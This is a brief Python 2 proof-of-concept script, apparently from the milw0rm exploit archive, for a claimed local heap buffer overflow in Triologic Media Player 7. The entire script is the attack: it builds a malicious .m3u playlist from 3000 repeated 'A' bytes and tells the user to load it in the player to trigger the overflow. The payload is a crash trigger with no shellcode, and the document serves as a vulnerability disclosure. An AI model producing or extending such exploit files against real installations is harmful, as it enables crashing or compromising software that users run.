# IN THE NAME OF ALLAH :)
#!/usr/bin/python
# Discovered By : zAx
# Download Application : http://www.download.com/Triologic-Media-Player/3000-2139_4-10601848.html?tag=mncol

print "**************************************************************************"
print " Triologic Media Player 7 (.m3u) Local Heap Buffer Overflow PoC\n"
print " Discovered By : zAx\n"
print " ThE-zAx@HoTMaiL.CoM\n"
print " In that PoC thanks for : Stack ;) My BrOthEr :)"
print "**************************************************************************"

overflow = "\x41" * 3000 # not right, just a PoC

try:
    out_file = open("zAx.m3u",'w')
    out_file.write(overflow)
    out_file.close()
    raw_input("\nPoC file created!, Now go to the program and click at Load Button\n")
except:
    print "Error"
# EoF

# milw0rm.com [2009-01-12]
